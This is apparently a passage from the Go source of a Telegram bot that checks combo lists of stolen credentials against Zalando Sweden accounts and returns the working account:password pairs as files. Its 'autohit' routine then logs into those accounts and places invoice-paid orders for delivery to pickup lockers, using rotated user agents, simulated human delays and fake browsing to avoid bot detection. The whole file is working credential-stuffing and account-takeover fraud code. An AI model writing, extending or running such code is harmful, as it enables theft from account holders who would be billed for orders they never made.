	invalid := atomic.LoadInt32(&currentStats.Invalid)
	checked := atomic.LoadInt32(&currentStats.Checked)
	skipped := atomic.LoadInt32(&currentStats.Skipped)

	addDebugLog("MASS", fmt.Sprintf("Completed: %d valid, %d invalid, %d skipped, CPM: %.0f", valid, invalid, skipped, cpm))

	var final string
	if wasStoppedManually {
		final = fmt.Sprintf("⏸️ *STOPPED*\n\n📊 Checked: `%d/%d`\n✅ Valid: `%d`\n❌ Invalid: `%d`\n⚠️ Skipped: `%d`\n\n⚡ CPM: `%.0f`\n⏱️ Time: `%.1f`s",
			checked, len(combos), valid, invalid, skipped, cpm, elapsed)
	} else {
		final = fmt.Sprintf("✅ *COMPLETED*\n\n📊 Total: `%d`\n✅ Valid: `%d`\n❌ Invalid: `%d`\n⚠️ Skipped: `%d`\n\n⚡ CPM: `%.0f`\n⏱️ Time: `%.1f`s\n\n🇸🇪 *SWEDEN*",
			len(combos), valid, invalid, skipped, cpm, elapsed)
	}

	deleteMessage(bot, msg.Chat.ID, statusMsg.MessageID)
	sendMessage(bot, msg.Chat.ID, final, true)

	// Send VALID file
	if len(currentStats.ValidList) > 0 {
		filename := fmt.Sprintf("zalando_valid_%s.txt", time.Now().Format("20060102_150405"))

		var content strings.Builder
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n"))
		content.WriteString(fmt.Sprintf("   ZALANDO SE VALID - %d accounts\n", len(currentStats.ValidList)))
		content.WriteString(fmt.Sprintf("   %s\n", time.Now().Format("2006-01-02 15:04:05")))
		content.WriteString(fmt.Sprintf("   🇸🇪 SWEDEN TARGET\n"))
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n\n"))

		for _, acc := range currentStats.ValidList {
			content.WriteString(fmt.Sprintf("%s\n", acc.Combo))
		}

		os.WriteFile(filename, []byte(content.String()), 0644)

		file := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FilePath(filename))
		file.Caption = fmt.Sprintf("✅ VALID | %d accounts | ⚡ %.0f CPM", len(currentStats.ValidList), cpm)
		bot.Send(file)

		addDebugLog("MASS", fmt.Sprintf("File %s sent (%d valid, %.0f CPM)", filename, len(currentStats.ValidList), cpm))

		txt := "🎯 *VALID PREVIEW:*\n\n"
		for i, acc := range currentStats.ValidList {
			if i >= 10 {
				txt += fmt.Sprintf("\n\n_\\+%d more in file_", len(currentStats.ValidList)-10)
				break
			}
			txt += fmt.Sprintf("`%s`\n", escapeMarkdownV2(acc.Combo))
		}
		sendMessage(bot, msg.Chat.ID, txt, true)

		os.Remove(filename)
	}
	
	// Send SKIPPED file
	if len(currentStats.SkippedList) > 0 {
		filename := fmt.Sprintf("zalando_skipped_%s.txt", time.Now().Format("20060102_150405"))

		var content strings.Builder
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n"))
		content.WriteString(fmt.Sprintf("   SKIPPED ACCOUNTS - %d total\n", len(currentStats.SkippedList)))
		content.WriteString(fmt.Sprintf("   %s\n", time.Now().Format("2006-01-02 15:04:05")))
		content.WriteString(fmt.Sprintf("   ⚠️ Elevated Risk / Rate Limited\n"))
		content.WriteString(fmt.Sprintf("   🔄 Recheck with better proxies\n"))
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n\n"))

		for _, acc := range currentStats.SkippedList {
			content.WriteString(fmt.Sprintf("%s\n", acc.Combo))
		}

		os.WriteFile(filename, []byte(content.String()), 0644)

		file := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FilePath(filename))
		file.Caption = fmt.Sprintf("⚠️ SKIPPED | %d accounts | Recheck these", len(currentStats.SkippedList))
		bot.Send(file)

		addDebugLog("MASS", fmt.Sprintf("Skipped file %s sent (%d accounts)", filename, len(currentStats.SkippedList)))

		os.Remove(filename)
	} else {
		sendMessage(bot, msg.Chat.ID, "✅ No accounts skipped!", false)
	}
}

// ====================================
// HELPERS
// ====================================

func generateCSRFToken() string {
	return fmt.Sprintf("%x-%x-%x-%x-%x",
		rand.Intn(0xFFFFFFFF),
		rand.Intn(0xFFFF),
		rand.Intn(0xFFFF),
		rand.Intn(0xFFFF),
		rand.Intn(0xFFFFFFFF))
}

func isValidEmail(email string) bool {
	regex := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
	return regex.MatchString(email)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func sendMessage(bot *tgbotapi.BotAPI, chatID int64, text string, markdown bool) tgbotapi.Message {
	msg := tgbotapi.NewMessage(chatID, text)
	if markdown {
		msg.ParseMode = "MarkdownV2"
	}
	sentMsg, _ := bot.Send(msg)
	return sentMsg
}

func deleteMessage(bot *tgbotapi.BotAPI, chatID int64, messageID int) {
	del := tgbotapi.NewDeleteMessage(chatID, messageID)
	bot.Send(del)
}

func escapeMarkdownV2(text string) string {
	specialChars := []string{"_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"}
	for _, char := range specialChars {
		text = strings.ReplaceAll(text, char, "\\"+char)
	}
	return text
}

func getEnvAsInt64(key string, defaultVal int64) int64 {
	valStr := os.Getenv(key)
	if valStr == "" {
		return defaultVal
	}
	var val int64
	fmt.Sscanf(valStr, "%d", &val)
	return val
}

// ====================================
// AUTOHITTER
// ====================================

func handleAutoHit(bot *tgbotapi.BotAPI, chatID int64, msgID int, options HitOptions) {
	result := performAutoHit(options)
	
	deleteMessage(bot, chatID, msgID)
	
	if result.Success {
		msg := fmt.Sprintf(
			"✅ *ORDER SUCCESS\\!*\n\n"+
				"📧 Account: `%s`\n"+
				"📦 Order ID: `%s`\n"+
				"🔗 Product: %s\n\n"+
				"💳 Payment: Faktura\n"+
				"📍 Pickup: INSTABOX/BUDBEE",
			escapeMarkdownV2(options.Email),
			escapeMarkdownV2(result.OrderID),
			escapeMarkdownV2(truncateURL(options.ProductURL)),
		)
		sendMessage(bot, chatID, msg, true)
	} else {
		errMsg := "Unknown error"
		if result.Error != nil {
			errMsg = result.Error.Error()
		} else if result.Message != "" {
			errMsg = result.Message
		}
		
		msg := fmt.Sprintf(
			"❌ *ORDER FAILED*\n\n"+
				"📧 Account: `%s`\n"+
				"🔗 Product: %s\n"+
				"⚠️ Error: %s",
			escapeMarkdownV2(options.Email),
			escapeMarkdownV2(truncateURL(options.ProductURL)),
			escapeMarkdownV2(errMsg),
		)
		sendMessage(bot, chatID, msg, true)
	}
}

func performAutoHit(options HitOptions) HitResult {
	addDebugLog("AUTOHIT", fmt.Sprintf("Starting autohit for %s", options.Email))
	
	// Step 1: Login
	addDebugLog("AUTOHIT", "Step 1: Login")
	client, err := loginAndGetClient(options)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Login failed: %v", err))
		return HitResult{Success: false, Error: err}
	}
	
	// Random delay after login (500-1500ms)
	humanDelay(500, 1500)
	
	// Step 2: Optional browse mode
	if options.BrowseMode {
		addDebugLog("AUTOHIT", "Step 2: Browse mode enabled - viewing random products")
		browseRandomProducts(client, options.ProxyURL)
	}
	
	// Step 3: Extract product SKU and add to cart
	addDebugLog("AUTOHIT", "Step 3: Add product to cart")
	err = addProductToCart(client, options.ProductURL, options.Size, options.ProxyURL)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Add to cart failed: %v", err))
		return HitResult{Success: false, Error: err, Message: "Failed to add product to cart"}
	}
	
	// Random delay (1-2s)
	humanDelay(1000, 2000)
	
	// Step 4: Navigate to checkout
	addDebugLog("AUTOHIT", "Step 4: Navigate to checkout")
	err = navigateToCheckout(client, options.ProxyURL)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Navigate to checkout failed: %v", err))
		return HitResult{Success: false, Error: err, Message: "Failed to navigate to checkout"}
	}
	
	// Random delay
	humanDelay(800, 1500)
	
	// Step 5: Handle address and delivery (pickup point)
	addDebugLog("AUTOHIT", "Step 5: Select pickup point")
	err = selectPickupPoint(client, options)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Pickup point selection failed: %v", err))
		return HitResult{Success: false, Error: err, Message: "Failed to select pickup point"}
	}
	
	// Random delay
	humanDelay(1000, 2000)
	
	// Step 6: Select Faktura payment
	addDebugLog("AUTOHIT", "Step 6: Select Faktura payment")
	err = selectFakturaPayment(client, options.ProxyURL)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Faktura selection failed: %v", err))
		return HitResult{Success: false, Error: err, Message: "Faktura payment not available or failed"}
	}
	
	// Random delay
	humanDelay(1000, 1500)
	
	// Step 7: Complete order
	addDebugLog("AUTOHIT", "Step 7: Complete order")
	orderID, err := completeOrder(client, options.ProxyURL)
	if err != nil {
		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Order completion failed: %v", err))
		return HitResult{Success: false, Error: err, Message: "Failed to complete order"}
	}
	
	addDebugLog("AUTOHIT-SUCCESS", fmt.Sprintf("Order completed successfully: %s", orderID))
	return HitResult{Success: true, OrderID: orderID}
}

func loginAndGetClient(options HitOptions) (*http.Client, error) {
	client, err := createHTTPClient(options.ProxyURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP client: %w", err)
	}
	
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// GET auth page
	getReq, _ := http.NewRequest("GET", "https://accounts.zalando.com/authenticate?client_id=fashion-store-web", nil)
	getReq.Header.Set("User-Agent", ua)
	getReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	getReq.Header.Set("Accept-Language", "sv-SE,sv;q=0.9")
	
	getResp, err := client.Do(getReq)
	if err != nil {
		return nil, fmt.Errorf("auth page request failed: %w", err)
	}
	io.ReadAll(getResp.Body)
	getResp.Body.Close()
	
	humanDelay(200, 500)
	
	// Extract CSRF token
	csrfToken := ""
	jar := client.Jar
	for _, cookie := range jar.Cookies(getReq.URL) {
		if cookie.Name == "csrf-token" || cookie.Name == "XSRF-TOKEN" {
			csrfToken = cookie.Value
			break
		}
	}
	if csrfToken == "" {
		csrfToken = generateCSRFToken()
	}
	
	// Login
	payload := LoginPayload{
		Email:  options.Email,
		Secret: options.Password,
		AuthenticationRequest: AuthRequest{
			ClientID:    "fashion-store-web",
			RequestID:   fmt.Sprintf("req%d:%d", rand.Intn(999999), time.Now().Unix()),
			RedirectURI: "https://www.zalando.se/sso/callback",
			UILocales:   "sv-SE",
			TC:          fmt.Sprintf("zcid:%d,pf:web", time.Now().Unix()),
		},
	}
	
	jsonData, _ := json.Marshal(payload)
	
	req, _ := http.NewRequest("POST", "https://accounts.zalando.com/api/sso/authentications/credentials", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://accounts.zalando.com")
	req.Header.Set("Referer", "https://accounts.zalando.com/authenticate")
	req.Header.Set("x-csrf-token", csrfToken)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("login request failed: %w", err)
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	if resp.StatusCode == 200 || resp.StatusCode == 204 || resp.StatusCode == 302 {
		var loginResp LoginResponse
		json.Unmarshal(body, &loginResp)
		
		if loginResp.RedirectURI != "" || resp.StatusCode == 302 || resp.StatusCode == 204 {
			addDebugLog("AUTOHIT", "Login successful")
			return client, nil
		}
	}
	
	return nil, fmt.Errorf("login failed: invalid credentials or blocked")
}

func browseRandomProducts(client *http.Client, proxyURL string) {
	addDebugLog("AUTOHIT", "Browsing random products for 10 seconds...")
	
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// Visit a category page
	categoryURLs := []string{
		"https://www.zalando.se/man-home/",
		"https://www.zalando.se/woman-home/",
	}
	
	categoryURL := categoryURLs[rand.Intn(len(categoryURLs))]
	req, _ := http.NewRequest("GET", categoryURL, nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	
	resp, err := client.Do(req)
	if err == nil {
		io.ReadAll(resp.Body)
		resp.Body.Close()
	}
	
	// Simulate browsing for ~10 seconds
	time.Sleep(time.Duration(8000+rand.Intn(4000)) * time.Millisecond)
}

func addProductToCart(client *http.Client, productURL, size, proxyURL string) error {
	// Extract SKU from URL
	sku := extractSKUFromURL(productURL, size)
	if sku == "" {
		return fmt.Errorf("could not extract SKU from URL")
	}
	
	addDebugLog("AUTOHIT", fmt.Sprintf("Adding product SKU: %s (size: %s)", sku, size))
	
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// First, visit the product page
	req, _ := http.NewRequest("GET", productURL, nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "sv-SE,sv;q=0.9")
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to visit product page: %w", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()
	
	humanDelay(800, 1500)
	
	// Use GraphQL to add to cart (format from captured APIs)
	// The actual format uses an array with id and variables
	// The "id" is a persisted query hash that Zalando uses for their GraphQL API
	addToCartPayload := []map[string]interface{}{
		{
			"id": "b4e7fbd5d2886732b3fa200fcff583ef0931c246ed50417203922471e7bc42ad",
			"variables": map[string]interface{}{
				"addToCartInput": map[string]string{
					"clientMutationId": "addToCartMutation",
					"productId":        sku,
				},
			},
		},
	}
	
	jsonData, _ := json.Marshal(addToCartPayload)
	
	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/graphql/add-to-cart/", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://www.zalando.se")
	req.Header.Set("Referer", productURL)
	
	resp, err = client.Do(req)
	if err != nil {
		return fmt.Errorf("add to cart request failed: %w", err)
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	if resp.StatusCode != 200 {
		return fmt.Errorf("add to cart failed with status %d: %s", resp.StatusCode, string(body))
	}
	
	// Check for errors in response
	var result []map[string]interface{}
	json.Unmarshal(body, &result)
	if len(result) > 0 {
		if data, ok := result[0]["data"].(map[string]interface{}); ok {
			if _, ok := data["addToCart"]; ok {
				addDebugLog("AUTOHIT", "Product added to cart successfully")
				return nil
			}
		}
		if errors, ok := result[0]["errors"]; ok {
			return fmt.Errorf("GraphQL error: %v", errors)
		}
	}
	
	addDebugLog("AUTOHIT", "Product added to cart successfully")
	return nil
}

func navigateToCheckout(client *http.Client, proxyURL string) error {
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// Navigate to cart first
	req, _ := http.NewRequest("GET", "https://www.zalando.se/cart/", nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to navigate to cart: %w", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()
	
	humanDelay(500, 1000)
	
	// Navigate to checkout/address
	req, _ = http.NewRequest("GET", "https://www.zalando.se/checkout/address", nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Referer", "https://www.zalando.se/cart/")
	
	resp, err = client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to navigate to checkout: %w", err)
	}
	bodyBytes, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	
	// Try to extract CSRF token from HTML
	body := string(bodyBytes)
	csrfToken := extractCSRFFromHTML(body)
	if csrfToken != "" {
		addDebugLog("AUTOHIT", fmt.Sprintf("Extracted CSRF token from HTML: %s", csrfToken[:20]+"..."))
	}
	
	addDebugLog("AUTOHIT", "Navigated to checkout")
	return nil
}

func extractCSRFFromHTML(html string) string {
	// Try to extract CSRF token from various patterns in HTML
	patterns := []string{
		`"csrfToken":"([^"]+)"`,
		`"csrf_token":"([^"]+)"`,
		`"xsrfToken":"([^"]+)"`,
		`name="csrf-token" content="([^"]+)"`,
		`data-csrf-token="([^"]+)"`,
		`XSRF-TOKEN["\s:=]+([A-Za-z0-9+/=_-]+)`,
	}
	
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(html)
		if len(matches) > 1 && matches[1] != "" {
			return matches[1]
		}
	}
	
	return ""
}

func getCSRFToken(client *http.Client) string {
	// Extract CSRF token from cookies
	zalandoURL, _ := url.Parse("https://www.zalando.se")
	jar := client.Jar
	for _, cookie := range jar.Cookies(zalandoURL) {
		// Check various possible cookie names
		cookieName := strings.ToLower(cookie.Name)
		if strings.Contains(cookieName, "xsrf") || strings.Contains(cookieName, "csrf") {
			return cookie.Value
		}
	}
	return ""
}

func selectPickupPoint(client *http.Client, options HitOptions) error {
	ua := userAgents[rand.Intn(len(userAgents))]
	
	phoneNumber := options.PhoneNumber
	if phoneNumber == "" {
		phoneNumber = "0767541615" // Fallback
	}
	
	// Get CSRF token for checkout requests
	csrfToken := getCSRFToken(client)
	addDebugLog("AUTOHIT", fmt.Sprintf("CSRF Token: %s", csrfToken))
	
	// Set phone number first
	phonePayload := map[string]interface{}{
		"phoneNumber": phoneNumber,
	}
	jsonData, _ := json.Marshal(phonePayload)
	
	req, _ := http.NewRequest("POST", "https://www.zalando.se/api/checkout/save-customer-phone-number", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://www.zalando.se")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
	if csrfToken != "" {
		req.Header.Set("x-xsrf-token", csrfToken)
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to save phone number: %w", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	
	// Extract customer info from response
	var customerInfo struct {
		Email     string `json:"email"`
		Phone     string `json:"phoneNumber"`
		FirstName string `json:"firstname"`
		LastName  string `json:"lastname"`
		Gender    string `json:"gender"`
	}
	json.Unmarshal(body, &customerInfo)
	
	humanDelay(500, 1000)
	
	// Get user's default address from the checkout page
	// For now, use a placeholder address structure
	addressPayload := map[string]interface{}{
		"address": map[string]interface{}{
			"salutation":   "Mr",
			"first_name":   customerInfo.FirstName,
			"last_name":    customerInfo.LastName,
			"zip":          "11151", // Stockholm default
			"city":         "Stockholm",
			"country_code": "SE",
			"street":       "Drottninggatan 1",
			"additional":   "",
		},
	}
	
	jsonData, _ = json.Marshal(addressPayload)
	
	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/checkout/search-pickup-points-by-address", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://www.zalando.se")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
	if csrfToken != "" {
		req.Header.Set("x-xsrf-token", csrfToken)
	}
	
	resp, err = client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to search pickup points: %w", err)
	}
	defer resp.Body.Close()
	
	body, _ = io.ReadAll(resp.Body)
	
	// Parse pickup points response
	var pickupPointsResp struct {
		DeliveryLocations []struct {
			ID          string `json:"id"`
			Name        string `json:"name"`
			Distance    string `json:"distance"`
			GeoPosition struct {
				Latitude  float64 `json:"latitude"`
				Longitude float64 `json:"longitude"`
			} `json:"geoPosition"`
			Address struct {
				City        string `json:"city"`
				Country     string `json:"country"`
				Street      string `json:"street"`
				Zip         string `json:"zip"`
				CountryCode string `json:"countryCode"`
			} `json:"address"`
			DeliveryProductOptions []struct {
				DeliveryProductID  string `json:"deliveryProductId"`
				ExternalLocationID string `json:"externalLocationId"`
				Carrier            string `json:"carrier"`
				Destination        string `json:"destination"`
				Service            string `json:"service"`
			} `json:"deliveryProductOptions"`
		} `json:"deliveryLocations"`
	}
	
	json.Unmarshal(body, &pickupPointsResp)
	
	addDebugLog("AUTOHIT", fmt.Sprintf("Found %d pickup points", len(pickupPointsResp.DeliveryLocations)))
	
	if len(pickupPointsResp.DeliveryLocations) == 0 {
		return fmt.Errorf("no pickup points found - response: %s", string(body))
	}
	
	// Find INSTABOX or BUDBEE pickup point (not the closest one)
	selectedIndex := -1
	
	// First try to find INSTABOX or BUDBEE (skip first if possible)
	for i, loc := range pickupPointsResp.DeliveryLocations {
		locationName := strings.ToUpper(loc.Name)
		if strings.Contains(locationName, "INSTABOX") || strings.Contains(locationName, "BUDBEE") {
			// Skip the first one only if we have more options
			if i == 0 && len(pickupPointsResp.DeliveryLocations) > 1 {
				continue
			}
			selectedIndex = i
			addDebugLog("AUTOHIT", fmt.Sprintf("Found %s pickup point: %s", loc.Name, loc.Address.Street))
			break
		}
	}
	
	// Fallback: use second location if available, or first location if only one exists
	if selectedIndex == -1 {
		if len(pickupPointsResp.DeliveryLocations) > 1 {
			selectedIndex = 1
			addDebugLog("AUTOHIT", fmt.Sprintf("Using fallback pickup point: %s", pickupPointsResp.DeliveryLocations[1].Name))
		} else {
			selectedIndex = 0
			addDebugLog("AUTOHIT", fmt.Sprintf("Using only available pickup point: %s", pickupPointsResp.DeliveryLocations[0].Name))
		}
	}
	
	selectedLocation := pickupPointsResp.DeliveryLocations[selectedIndex]
	
	humanDelay(800, 1500)
	
	// Select the pickup point with full payload structure
	selectPayload := map[string]interface{}{
		"address": addressPayload["address"],
		"deliveryLocation": map[string]interface{}{
			"id":       selectedLocation.ID,
			"distance": selectedLocation.Distance,
			"geoPosition": map[string]interface{}{
				"latitude":  selectedLocation.GeoPosition.Latitude,
				"longitude": selectedLocation.GeoPosition.Longitude,
			},
			"name": selectedLocation.Name,
			"address": map[string]interface{}{
				"city":        selectedLocation.Address.City,
				"country":     selectedLocation.Address.Country,
				"street":      selectedLocation.Address.Street,
				"zip":         selectedLocation.Address.Zip,
				"countryCode": selectedLocation.Address.CountryCode,
			},
			"deliveryProductOptions": selectedLocation.DeliveryProductOptions,
		},
	}
	
	jsonData, _ = json.Marshal(selectPayload)
	
	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/checkout/select-pickup-point", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://www.zalando.se")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
	if csrfToken != "" {
		req.Header.Set("x-xsrf-token", csrfToken)
	}
	
	resp, err = client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to select pickup point: %w", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()
	
	if resp.StatusCode != 200 {
		return fmt.Errorf("pickup point selection failed with status %d", resp.StatusCode)
	}
	
	addDebugLog("AUTOHIT", fmt.Sprintf("Selected pickup point: %s", selectedLocation.Name))
	
	// Call next-step to proceed to payment
	humanDelay(500, 1000)
	req, _ = http.NewRequest("GET", "https://www.zalando.se/api/checkout/next-step", nil)
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
	
	resp, err = client.Do(req)
	if err == nil {
		io.ReadAll(resp.Body)
		resp.Body.Close()
	}
	
	return nil
}

func selectFakturaPayment(client *http.Client, proxyURL string) error {
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// Navigate to payment page
	req, _ := http.NewRequest("GET", "https://www.zalando.se/checkout/payment", nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to navigate to payment page: %w", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	
	bodyStr := string(body)
	
	// Check if Faktura/BNPL is available in the page
	if !strings.Contains(strings.ToLower(bodyStr), "faktura") && 
	   !strings.Contains(strings.ToLower(bodyStr), "invoice") && 
	   !strings.Contains(strings.ToLower(bodyStr), "bnpl") {
		return fmt.Errorf("Faktura payment not available")
	}
	
	humanDelay(1000, 2000)
	
	addDebugLog("AUTOHIT", "Faktura payment method available")
	
	// The payment selection happens on the frontend, so we just need to ensure
	// the page loaded correctly and Faktura is available
	// The actual payment method selection will be done during order placement
	
	return nil
}

func completeOrder(client *http.Client, proxyURL string) (string, error) {
	ua := userAgents[rand.Intn(len(userAgents))]
	
	// Get CSRF token
	csrfToken := getCSRFToken(client)
	
	addDebugLog("AUTOHIT", "Attempting to place order")
	
	// First, get the next step which should show us the confirmation page
	req, _ := http.NewRequest("GET", "https://www.zalando.se/api/checkout/next-step", nil)
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Referer", "https://www.zalando.se/checkout/payment")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/payment")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to get next step: %w", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	
	var nextStepResp struct {
		URL string `json:"url"`
	}
	json.Unmarshal(body, &nextStepResp)
	
	humanDelay(500, 1000)
	
	// Navigate to confirmation page if available
	if nextStepResp.URL != "" {
		req, _ = http.NewRequest("GET", "https://www.zalando.se"+nextStepResp.URL, nil)
		req.Header.Set("User-Agent", ua)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Referer", "https://www.zalando.se/checkout/payment")
		
		resp, err = client.Do(req)
		if err == nil {
			io.ReadAll(resp.Body)
			resp.Body.Close()
		}
	}
	
	humanDelay(1000, 1500)
	
	// Place the order
	// Note: The actual endpoint may vary based on the payment method
	// For Faktura/Invoice, it might be a different endpoint
	orderPayload := map[string]interface{}{
		"paymentMethod": "invoice",
		"terms":         true,
	}
	jsonData, _ := json.Marshal(orderPayload)
	
	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/checkout/place-order", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Origin", "https://www.zalando.se")
	req.Header.Set("Referer", "https://www.zalando.se/checkout/payment")
	if csrfToken != "" {
		req.Header.Set("x-xsrf-token", csrfToken)
	}
	
	resp, err = client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to place order: %w", err)
	}
	defer resp.Body.Close()
	
	body, _ = io.ReadAll(resp.Body)
	bodyStr := string(body)
	
	addDebugLog("AUTOHIT", fmt.Sprintf("Order response status: %d", resp.StatusCode))
	
	// Parse response to extract order ID
	if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 302 {
		var orderResp struct {
			OrderID     string `json:"orderId"`
			OrderNumber string `json:"orderNumber"`
			ID          string `json:"id"`
			RedirectURL string `json:"redirectUrl"`
		}
		
		json.Unmarshal(body, &orderResp)
		
		orderID := orderResp.OrderID
		if orderID == "" {
			orderID = orderResp.OrderNumber
		}
		if orderID == "" {
			orderID = orderResp.ID
		}
		
		// If we got a redirect, follow it to get the order confirmation
		if orderResp.RedirectURL != "" {
			humanDelay(500, 1000)
			req, _ = http.NewRequest("GET", orderResp.RedirectURL, nil)
			req.Header.Set("User-Agent", ua)
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			
			resp, err = client.Do(req)
			if err == nil {
				confirmBody, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				
				// Try to extract order ID from confirmation page
				extractedID := extractOrderIDFromResponse(string(confirmBody))
				if extractedID != "" {
					orderID = extractedID
				}
			}
		}
		
		if orderID == "" {
			// Try to extract from response body
			orderID = extractOrderIDFromResponse(bodyStr)
		}
		
		if orderID == "" {
			return "", fmt.Errorf("order placed but could not extract order ID from response")
		}
		
		return orderID, nil
	}
	
	return "", fmt.Errorf("order placement failed with status %d: %s", resp.StatusCode, bodyStr)
}

// Helper functions

func humanDelay(minMs, maxMs int) {
	delay := time.Duration(minMs+rand.Intn(maxMs-minMs)) * time.Millisecond
	time.Sleep(delay)
}

func extractSKUFromURL(productURL, size string) string {
	// Example URL: https://www.zalando.se/polo-ralph-lauren-the-gorham-glossed-down-jacket-dunjacka-black-po222t0fo-q11.html
	// SKU format: PO222T0FO-Q11000S000 (uppercase with size code)
	parts := strings.Split(productURL, "/")
	if len(parts) > 0 {
		lastPart := parts[len(parts)-1]
		sku := strings.TrimSuffix(lastPart, ".html")
		
		// Extract the config SKU (last part after last dash)
		skuParts := strings.Split(sku, "-")
		if len(skuParts) >= 2 {
			// The SKU is usually in format like "po222t0fo-q11"
			// We need to construct the full SKU: PO222T0FO-Q11000S000
			baseCode := strings.ToUpper(skuParts[len(skuParts)-2])
			variantCode := strings.ToUpper(skuParts[len(skuParts)-1])
			
			// Map size to Zalando size code
			sizeCode := getSizeCode(size)
			
			fullSKU := baseCode + "-" + variantCode + sizeCode
			return fullSKU
		}
	}
	return ""
}

func getSizeCode(size string) string {
	// Convert user-friendly size to Zalando size code
	sizeUpper := strings.ToUpper(size)
	
	sizeMap := map[string]string{
		"XXS":       "000XXS",
		"XS":        "000XS0",
		"S":         "000S00",
		"M":         "000M00",
		"L":         "000L00",
		"XL":        "000XL0",
		"XXL":       "000XXL",
		"XXXL":      "00XXXL",
		"ONE_SIZE":  "000000",
		"ONESIZE":   "000000",
		"ONE":       "000000",
	}
	
